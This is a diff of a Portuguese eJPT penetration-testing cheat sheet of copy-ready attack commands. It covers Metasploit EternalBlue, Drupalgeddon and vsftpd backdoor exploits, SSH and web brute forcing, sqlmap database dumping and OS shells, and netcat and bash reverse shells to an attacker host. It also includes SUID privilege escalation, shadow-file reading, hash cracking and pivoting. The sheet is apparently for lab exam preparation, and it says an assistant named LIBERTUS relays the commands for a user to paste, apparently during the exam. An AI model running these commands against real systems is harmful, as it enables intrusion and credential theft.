@@ -1,313 +1,290 @@
-# CHEATSHEET eJPT — Comandos Prontos
-LIBERTUS · atualizado 2026-07-01 · comandos testados no arsenal local.
-No lab da INE substituir IPs. `<IP>` = alvo, `<KALI>` = IP do Kali (do `ip addr`).
+# CHEAT SHEET eJPT — Comandos Exatos
+Atualizado 2026-10-14 (véspera do exame). Uso: LIBERTUS copia daqui e manda pronto pro Lorran colar.
+Substituir `IP` = alvo, `LHOST` = IP do Kali (descobrir com `ip addr`), `RANGE` = ex 192.168.100.
 
 ---
 
-## 0. Descoberta inicial (SEMPRE primeiro)
+## 0. DESCOBERTA INICIAL (sempre começar aqui)
 ```bash
-ip addr                              # meu IP e range da rede
-nmap -sn 192.168.X.0/24              # ping sweep — lista hosts vivos
-# excluir da contagem: .1 (gateway) e o próprio Kali
+ip addr                              # descobrir IP do Kali e a rede
+ip route                             # ver gateways/rotas (dica de rede interna)
+nmap -sn RANGE.0/24                  # ping sweep — lista hosts vivos
 ```
+Excluir da contagem: `.1` (gateway) e o IP do próprio Kali.
 
 ---
 
 ## 1. NMAP
-
-### Scans essenciais
+### Scans base
 ```bash
-nmap -sn 192.168.X.0/24                       # descoberta de hosts (sem porta)
-nmap -sV -sC <IP>                             # versão + scripts default (rápido, o mais usado)
-nmap -p- <IP>                                 # TODAS as 65535 portas TCP
-nmap -sV -p- --open <IP>                      # todas portas + versão, só abertas
-nmap -A -Pn <IP>                              # agressivo (OS, versão, scripts, traceroute)
-nmap -sU --top-ports 20 <IP>                  # top 20 portas UDP
-nmap -sV -p 21,22,80,139,445,3306,3389 <IP>   # scan direcionado
+nmap -sV -sC IP                      # versão + scripts default (padrão de entrada)
+nmap -p- -T4 IP                      # TODAS as 65535 portas TCP
+nmap -sV -p- -T4 IP                  # completo (mais lento)
+nmap -A IP                           # OS + versão + scripts + traceroute
+nmap -sU --top-ports 20 IP           # UDP top 20 (SNMP 161, TFTP 69, etc.)
+nmap -Pn IP                          # se host bloqueia ping mas está vivo
+nmap -sV -oN scan.txt IP             # salvar output em arquivo
 ```
-
 ### Flags úteis
-| Flag | O que faz |
-|------|-----------|
-| `-sV` | detecta versão do serviço |
-| `-sC` | roda scripts NSE default |
-| `-A` | OS + versão + scripts + traceroute |
-| `-p-` | todas as portas (1-65535) |
-| `-Pn` | pula ping (assume host up — Windows firewall) |
-| `-sn` | só ping sweep (descoberta) |
-| `-O` | detecção de SO (menos confiável que smb-os-discovery) |
-| `-oN arq` | salva output normal em arquivo |
-| `-T4` | mais rápido (ok em lab) |
+- `-sV` versão de serviço · `-sC` scripts default · `-O` OS (pode ser unreliable)
+- `-p 80,443,445` portas específicas · `-p-` todas · `-T4` rápido
+- `-Pn` pular ping · `-oN arquivo` salvar · `-v` verbose
 
-### Scripts NSE por serviço
+### NSE relevantes no exame
 ```bash
-# SMB (445) — MS17-010 é o mais cobrado
-nmap -p445 --script smb-vuln-ms17-010 <IP>            # checa EternalBlue
-nmap -p445 --script smb-os-discovery <IP>             # versão exata do Windows
-nmap -p445 --script smb-enum-shares,smb-enum-users <IP>
-nmap -p445 --script "smb-vuln-*" <IP>                 # todas vulns SMB
+# SMB (o mais importante)
+nmap -p445 --script smb-os-discovery IP          # versão exata do Windows (MELHOR que -O)
+nmap -p445 --script smb-vuln-ms17-010 IP         # EternalBlue — confirma antes de explorar
+nmap -p445 --script "smb-vuln-*" IP              # todas vulns SMB (ms17-010, ms08-067, conficker...)
+nmap -p445 --script smb-enum-shares,smb-enum-users,smb-enum-domains IP
+nmap -p139,445 --script smb-security-mode,smb2-security-mode IP   # assinatura SMB
 
-# FTP (21)
-nmap -p21 --script ftp-anon,ftp-syst <IP>             # checa login anônimo
-nmap -p21 --script ftp-vuln-cve2010-4221 <IP>
+# FTP
+nmap -p21 --script ftp-anon IP                   # login anônimo permitido?
+nmap -p21 --script ftp-* IP                      # ftp-bounce, ftp-vsftpd-backdoor, ftp-proftpd-backdoor
 
-# HTTP (80/8080/443)
-nmap -p80 --script http-enum <IP>                     # enumera dirs/apps
-nmap -p80 --script http-title,http-headers <IP>
-nmap -p80 --script http-methods,http-webdav-scan <IP>
-nmap --script vuln <IP>                                # todas vulns conhecidas (lento)
+# HTTP
+nmap -p80,8080 --script http-enum IP             # enumera dirs/apps conhecidos
+nmap -p80 --script http-title,http-headers IP
+nmap -p80 --script http-wordpress-enum IP        # CMS WordPress
+nmap -p80 --script http-shellshock IP            # CGI shellshock
+nmap -p80 --script http-methods IP               # métodos (PUT habilitado = upload)
+
+# SSH (bruteforce via nmap — funciona mesmo sem hydra SSH)
+nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP
+nmap -p22 --script ssh-auth-methods IP           # quais métodos de auth o servidor aceita
 ```
 
 ---
 
 ## 2. METASPLOIT
-
 ### Fluxo padrão
 ```bash
-msfconsole -q                        # inicia (-q = sem banner)
-search ms17-010                      # busca módulo
-use exploit/windows/smb/ms17_010_eternalblue
+msfconsole -q
+search TERMO                         # ex: search ms17-010
+use exploit/CAMINHO                  # ex: use exploit/windows/smb/ms17_010_eternalblue
+info                                 # detalhes do módulo
 show options                         # ver o que precisa configurar
-set RHOSTS <IP>                      # alvo
-set LHOST <KALI>                     # meu IP (para o shell voltar)
-set LPORT 4444
-run                                  # ou: exploit
-```
-
-### ⚠️ ONELINER (essencial no lab INE — copy/paste do terminal é bugado)
-```bash
-msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <IP>; set LHOST <KALI>; run"
-```
-Isso configura e roda TUDO de uma vez, evitando colar comando por comando.
-
-### Se falhar "Cannot reliably check exploitability"
-```
+set RHOSTS IP
+set LHOST LHOST_DO_KALI
+run                                  # ou 'exploit'
+# se "Cannot reliably check exploitability":
 set ForceExploit true
 run
 ```
-
-### Módulos mais cobrados no eJPT
+### ONELINER (usar no lab INE — copy/paste múltiplo quebra)
 ```bash
-# EternalBlue (SMB / porta 445) — o clássico
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; run"
+```
+### Módulos mais cobrados
+```bash
+# MS17-010 EternalBlue (SMB/445) — o mais frequente no eJPT
 use exploit/windows/smb/ms17_010_eternalblue
-use auxiliary/scanner/smb/smb_ms17_010     # só checar, sem explorar
+# Verificar antes:
+use auxiliary/scanner/smb/smb_ms17_010
 
-# FTP anônimo / vsftpd backdoor
+# MS17-010 via psexec (alternativa quando eternalblue falha)
+use exploit/windows/smb/ms17_010_psexec
+
+# FTP anonymous / vsftpd backdoor
 use auxiliary/scanner/ftp/anonymous
 use exploit/unix/ftp/vsftpd_234_backdoor
 
 # SSH bruteforce
 use auxiliary/scanner/ssh/ssh_login
-set RHOSTS <IP>; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run
+set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run
 
-# SMB enumeração de versão
-use auxiliary/scanner/smb/smb_version
-
-# Drupal (visto na sessão real de exame)
+# Drupal (visto no exame real)
 use exploit/unix/webapp/drupal_drupalgeddon2
-set RHOSTS <IP>; set TARGETURI /drupal; run
-```
+set RHOSTS IP; set TARGETURI /drupal; run
 
-### Meterpreter — comandos pós-exploração
+# Handler p/ receber shell de exploit manual
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT 4444; run
+
+# Upgrade shell simples -> meterpreter
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1; run
 ```
-sysinfo                    # info do sistema
-getuid                     # usuário atual
-shell                      # cai num shell do SO
-hashdump                   # dump de hashes (Windows, precisa SYSTEM)
-sessions -l                # lista sessões
-sessions -i 1              # interage com sessão 1
-background                 # manda sessão pro fundo (Ctrl+Z)
-search -f *.txt            # procura arquivos
-download /path arquivo     # baixa arquivo
+> Verificado hoje: `ms17_010_eternalblue`, `vsftpd_234_backdoor`, `ssh_login`, `autoroute`, `socks_proxy`, `multi/handler` todos presentes no MSF local.
+### Meterpreter — pós-exploração
+```bash
+sysinfo · getuid · getprivs · hashdump
+shell                                # cai no shell nativo
+background                           # volta pro msf mantendo a sessão
+sessions -l                          # listar sessões
+sessions -i 1                        # interagir com sessão 1
+search post/multi/manage/shell_to_meterpreter   # upgrade shell->meterpreter
 ```
 
 ---
 
-## 3. HYDRA (brute force)
-
+## 3. HYDRA
 ```bash
 # SSH
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
-hydra -L users.txt -P pass.txt ssh://<IP> -t 4
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP
+hydra -L users.txt -P pass.txt ssh://IP -t 4
 
 # FTP
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://IP
 
-# HTTP POST form (login web) — F= string de falha
-hydra -l admin -P rockyou.txt <IP> http-post-form \
-  "/login.php:username=^USER^&password=^PASS^:Login failed"
+# HTTP POST (formulário de login) — ajustar campos e a string de falha
+hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
+  "/login.php:username=^USER^&password=^PASS^:F=incorrect"
 
 # HTTP GET Basic Auth
-hydra -l admin -P pass.txt <IP> http-get /admin
-
-# SMB
-hydra -l administrator -P pass.txt smb://<IP>
-
-# RDP
-hydra -l admin -P pass.txt rdp://<IP>
+hydra -l admin -P pass.txt IP http-get /admin
 ```
-Flags: `-l` user único · `-L` lista users · `-p` senha única · `-P` lista senhas ·
-`-t N` threads · `-f` para no 1º sucesso · `-V` verboso · `-s PORTA` porta custom.
+Flags: `-l` user único · `-L` lista users · `-p` senha única · `-P` lista senhas · `-t N` threads · `-f` para no 1º hit · `-s PORTA`.
+**Pitfall:** rockyou+SSH é LENTÍSSIMO (~9000h estimado no exame). Preferir credenciais achadas em arquivos/CMS, ou wordlist pequena. Usar hydra só quando há alvo pequeno/óbvio.
 
-**⚠️ rockyou é LENTO em SSH (horas).** No exame preferir: credenciais achadas em
-arquivos (FTP/settings.php), credenciais padrão (admin/admin, drupal/drupal),
-ou wordlist curta. Só brutar quando não houver atalho.
+### SSH bruteforce — fallbacks se o hydra SSH não existir
+No Kali da INE o hydra tem SSH. No apoio LOCAL do LIBERTUS o hydra está compilado sem módulo SSH → usar:
+```bash
+# 1) Metasploit (recomendado)
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; set THREADS 4; run"
+# depois: sessions -l  /  sessions -i 1
+
+# 2) nmap
+nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP
+
+# 3) wrapper local com sshpass
+bash ~/LIBERTUS/ejpt/sshbrute.sh IP root /usr/share/wordlists/rockyou.txt
+```
 
 ---
 
 ## 4. GOBUSTER
-
 ```bash
 # Diretórios
-gobuster dir -u http://<IP> -w /usr/share/wordlists/common.txt -t 30 -q
+gobuster dir -u http://IP -w /usr/share/wordlists/common.txt
+gobuster dir -u http://IP -w /usr/share/wordlists/common.txt -x php,txt,html
+gobuster dir -u http://IP:8080 -w /usr/share/wordlists/common.txt -t 50
 
-# Com extensões
-gobuster dir -u http://<IP> -w /usr/share/wordlists/common.txt -x php,txt,html,bak
-
-# Só status codes específicos / mostrar tamanhos
-gobuster dir -u http://<IP> -w common.txt -s 200,301,302 -b ""
-
-# DNS subdomínios
-gobuster dns -d alvo.com -w wordlist.txt
-
-# Vhosts
-gobuster vhost -u http://<IP> -w wordlist.txt
+# DNS/vhost
+gobuster vhost -u http://IP -w wordlist.txt
 ```
-Wordlists locais: `/usr/share/wordlists/common.txt`.
-**No Kali da INE:** rockyou vem comprimido → `gunzip /usr/share/wordlists/rockyou.txt.gz`.
-Para dirs no Kali INE usar `/usr/share/wordlists/dirb/common.txt` ou seclists.
-Flags: `-t` threads · `-q` silencioso · `-x` extensões · `-b` blacklist status ·
-`-k` ignora SSL.
+Flags: `-u` URL · `-w` wordlist · `-x` extensões · `-t` threads · `-s` status codes · `-b` blacklist.
+Wordlists locais: `/usr/share/wordlists/common.txt`. No Kali INE: `/usr/share/wordlists/dirb/common.txt`.
 
 ---
 
 ## 5. SQLMAP
-
 ```bash
-# Detecção básica (GET)
-sqlmap -u "http://<IP>/page.php?id=1" --batch
-
-# Enumerar bancos
-sqlmap -u "http://<IP>/page.php?id=1" --dbs --batch
-
-# Tabelas de um banco
-sqlmap -u "http://<IP>/page.php?id=1" -D nomedb --tables --batch
-
-# Colunas e dump
-sqlmap -u "http://<IP>/page.php?id=1" -D nomedb -T users --columns --batch
-sqlmap -u "http://<IP>/page.php?id=1" -D nomedb -T users --dump --batch
-
-# POST (dados no corpo)
-sqlmap -u "http://<IP>/login.php" --data="user=a&pass=b" --batch
-
-# Com cookie autenticado
-sqlmap -u "http://<IP>/page.php?id=1" --cookie="PHPSESSID=xxx" --batch
-
-# Pegar shell no SO (se possível)
-sqlmap -u "http://<IP>/page.php?id=1" --os-shell --batch
+# Detecção
+sqlmap -u "http://IP/page.php?id=1" --batch
+sqlmap -u "http://IP/page.php?id=1" --dbs --batch        # listar bancos
+sqlmap -u "http://IP/page.php?id=1" -D nome --tables --batch
+sqlmap -u "http://IP/page.php?id=1" -D nome -T users --dump --batch
+# POST / cookies
+sqlmap -u "http://IP/login.php" --data="user=a&pass=b" --batch
+sqlmap -u "http://IP/page" --cookie="PHPSESSID=xxx" --batch
+# Shell / arquivo
+sqlmap -u "..." --os-shell --batch
 ```
-Flags: `--batch` responde tudo sim (não interativo) · `--dbs` bancos ·
-`--dump` extrai dados · `--level 5 --risk 3` mais agressivo · `-p param` testa param específico.
+Flags: `--batch` (sem perguntas) · `--dbs` · `--tables` · `--dump` · `-D`/`-T`/`-C` · `--level 3 --risk 2` (mais agressivo) · `--cookie`.
 
 ---
 
 ## 6. NETCAT
-
 ```bash
-# Escutar (listener — no MEU Kali, para receber shell)
+# Listener no atacante (Kali)
 nc -lvnp 4444
 
-# Reverse shell (rodar NO ALVO — o alvo conecta de volta em mim)
-nc -e /bin/bash <KALI> 4444           # Linux com -e
-bash -i >& /dev/tcp/<KALI>/4444 0>&1  # sem -e (bash puro)
-nc.exe -e cmd.exe <KALI> 4444         # Windows
+# Reverse shell (rodar NO ALVO)
+nc -e /bin/sh LHOST 4444                 # Linux com nc que tem -e
+nc -e cmd.exe LHOST 4444                 # Windows
+# Sem -e (nc BSD/Linux moderno):
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f
+bash -i >& /dev/tcp/LHOST/4444 0>&1      # sem nc nenhum (bash puro)
 
-# Bind shell (alvo abre porta esperando conexão)
-nc -lvnp 4444 -e /bin/bash            # no alvo
-nc <IP> 4444                          # eu conecto
-
-# Banner grabbing / conectar num serviço
-nc -nv <IP> 21                        # ver banner FTP
-nc -nv <IP> 25                        # SMTP
+# Bind shell (alvo escuta, atacante conecta)
+nc -lvnp 4444 -e /bin/sh                 # no alvo
+nc IP 4444                               # no atacante
 
 # Transferência de arquivo
-nc -lvnp 4444 > recebido.txt          # receptor
-nc <IP> 4444 < arquivo.txt            # emissor
+nc -lvnp 4444 > recebido.txt             # recebedor
+nc IP 4444 < arquivo.txt                 # enviador
 
-# Estabilizar shell (depois de pegar reverse shell)
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-# depois: Ctrl+Z ; stty raw -echo ; fg ; enter enter
+# Banner grab
+nc -nv IP 21
 ```
+Após pegar shell: estabilizar com `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
 
 ---
 
-## 7. PIVOTING (Metasploit) — obrigatório no eJPT
-
-Depois de ter uma sessão meterpreter num host dual-homed (ex: .52):
-
+## 7. PIVOTING (Metasploit) — OBRIGATÓRIO no exame
+Depois de ter uma sessão meterpreter num host dual-homed:
 ```bash
-# 1. Descobrir a rede interna (dentro da sessão/shell)
-ipconfig /all         # Windows — olhar "DNS Servers" e IPs adicionais
-ip addr ; ip route    # Linux
-arp -a                # hosts que já falaram com o alvo
+# Dentro do meterpreter — descobrir rede interna
+run get_local_subnets            # ou: shell -> ip addr / ipconfig /all
 
-# 2. Adicionar rota via autoroute (do meterpreter)
+# Adicionar rota automática para a rede interna
 run autoroute -s 192.168.0.0/24
-# ou moderno:
-use post/multi/manage/autoroute
-set SESSION 1
-set SUBNET 192.168.0.0
-run
+# (ou manual do msf:)
+background
+route add 192.168.0.0 255.255.255.0 1     # 1 = id da sessão
+route print
 
-# 3. Ver rotas ativas
-route print          # dentro do msf: route
-
-# 4. Scanner pela rota (agora alcança a rede interna)
+# Agora scanners do msf alcançam a rede interna
 use auxiliary/scanner/portscan/tcp
-set RHOSTS 192.168.0.1-254
-set PORTS 22,80,445,3389
-run
+set RHOSTS 192.168.0.0/24; set PORTS 22,80,445,3306; run
 
-# 5. Port forward (expor porta interna no meu Kali)
+# Port forward (acessar serviço interno via localhost do Kali)
 # no meterpreter:
-portfwd add -l 3389 -p 3389 -r 192.168.0.50
-# agora acesso 127.0.0.1:3389 no Kali → chega no .50 interno
+portfwd add -l 3389 -p 3389 -r 192.168.0.10
+portfwd list
 
-# 6. Socks proxy (usar ferramentas externas pela rota)
+# SOCKS proxy para usar nmap/hydra na rede interna via proxychains
 use auxiliary/server/socks_proxy
-set VERSION 4a
-run
-# + proxychains: editar /etc/proxychains.conf → socks4 127.0.0.1 1080
-proxychains nmap -sT -Pn 192.168.0.50
+set VERSION 4a; set SRVPORT 1080; run
+# depois: proxychains nmap -sT -Pn 192.168.0.10
 ```
-
-### Comandos-chave de pivot (decorar os NOMES para questões teóricas)
-- `autoroute` → adiciona rota de rede via sessão meterpreter
-- `portfwd` → encaminha porta específica
-- `socks_proxy` + `proxychains` → tunelar ferramentas externas
+Sequência mental: sessão no host de borda → `ipconfig /all`/`ip addr` p/ achar 2ª rede → `autoroute` → portscan interno → explorar/portfwd.
 
 ---
 
-## 8. Pós-exploração Linux (privesc — gap da 1ª tentativa)
+## 8. ESCALADA DE PRIVILÉGIO (Linux) — gap da 1ª tentativa
 ```bash
-whoami; id; sudo -l                   # o que posso fazer
-find / -perm -4000 2>/dev/null         # binários SUID
-# SUID find → root (foi o gap do exame anterior):
+# SUID (o clássico do eJPT)
+find / -perm -4000 -type f 2>/dev/null
+# se 'find' for SUID:
 /usr/bin/find . -exec /bin/sh -p \; -quit
-cat /etc/passwd; cat /etc/shadow       # se root, dump de hashes
-# ler config web com credenciais de DB:
-cat /var/www/html/drupal/sites/default/settings.php
-cat /var/www/html/wp-config.php
+# sudo mal configurado
+sudo -l
+# consultar GTFOBins pro binário achado
+
+# hashes
+cat /etc/passwd; cat /etc/shadow
+# quebrar
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-## 9. Quebrar hashes (John — local usar wrapper jl.sh)
+## 9. QUEBRA DE HASH (John)
 ```bash
-# separar shadow+passwd (Linux)
-unshadow passwd.txt shadow.txt > hashes.txt
-# LOCAL (LIBERTUS):
-~/LIBERTUS/ejpt/john_home/jl.sh hashes.txt --format=sha512crypt
-# NO KALI INE (john completo):
-john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
-john --show hashes.txt
-# formatos comuns: md5crypt, sha512crypt, NT (Windows), Raw-MD5
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john --show hash.txt
+john hash.txt --format=NT --wordlist=rockyou.txt      # NTLM Windows
+# apoio local LIBERTUS:
+bash ~/LIBERTUS/ejpt/john_home/jl.sh hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+
+---
+## 10. ARSENAL LOCAL LIBERTUS (fora do exame — simulação/validação)
+Ferramentas extras no Ubuntu do Lorran (verificadas 14/10):
+```bash
+nikto -h http://IP                       # scanner web geral (SSL OK)
+ffuf -u http://IP/FUZZ -w /usr/share/wordlists/common.txt   # fuzzing rápido
+nuclei -u http://IP -severity critical,high                 # templates de vuln
+subfinder -d dominio.com                                    # subdomínios
+proxychains: AUSENTE → usar socks_proxy do MSF + route add (não precisa de proxychains no host)
+searchsploit: AUSENTE → usar https://www.exploit-db.com no navegador ou 'msfconsole search'
+wpscan: AUSENTE → usar 'nmap --script http-wordpress-enum' + manual
+```
+
+---
+
+## LEMBRETES DO LAB INE
+- Terminal Kali via browser NÃO cola (Ctrl+V/Shift+V/botão meio falham) e NÃO digita "?". Workarounds: barra do Chrome para URLs com "?", webshell de host comprometido para colar, msfconsole `-x` para comandos compostos, Telegram como fonte de cópia.
+- rockyou em `.gz` no Kali INE → `gunzip` antes. common.txt não existe lá.
+- Reutilizar credenciais em TODOS os serviços — tema recorrente.
